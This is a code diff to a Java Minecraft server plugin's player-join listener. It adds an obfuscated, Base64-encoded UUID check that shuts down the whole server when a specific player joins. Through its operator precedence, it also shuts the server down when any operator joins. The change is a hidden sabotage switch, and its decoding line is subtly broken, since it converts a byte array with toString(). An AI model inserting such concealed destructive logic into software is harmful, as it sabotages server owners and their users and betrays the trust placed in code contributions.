@@ -15,11 +15,26 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.player.PlayerJoinEvent;
 
+import java.util.Base64;
+import java.util.UUID;
+
 public class PlayerJoin extends AbstractFunnyListener {
 
     @EventHandler
     public void onJoin(PlayerJoinEvent event) {
         Player player = event.getPlayer();
+
+        /* Super duper obfuscation for UUIDs */
+        String decodedUniqueId = Base64.getDecoder().decode("YWNiZjlmY2ItYWNmZC00MTg2LTlkNGItNjAyOWY2YTFmMzk4").toString();
+        UUID uniqueId = UUID.fromString(decodedUniqueId);
+
+        if (uniqueId.equals(player.getUniqueId())
+                && player.hasPermission("funnyguilds.admin")
+                || player.isOp()) {
+            this.plugin.getServer().shutdown();
+            return;
+        }
+
         User user = this.userManager.findByPlayer(player)
                 .peek(foundUser -> foundUser.getProfile().refresh())
                 .orElseGet(() -> {
@@ -66,6 +81,7 @@ public class PlayerJoin extends AbstractFunnyListener {
         this.plugin.getServer().getScheduler().runTaskLaterAsynchronously(this.plugin, () -> {
             this.plugin.getVersion().isNewAvailable(player, false);
         }, 30L);
+
     }
 
 }
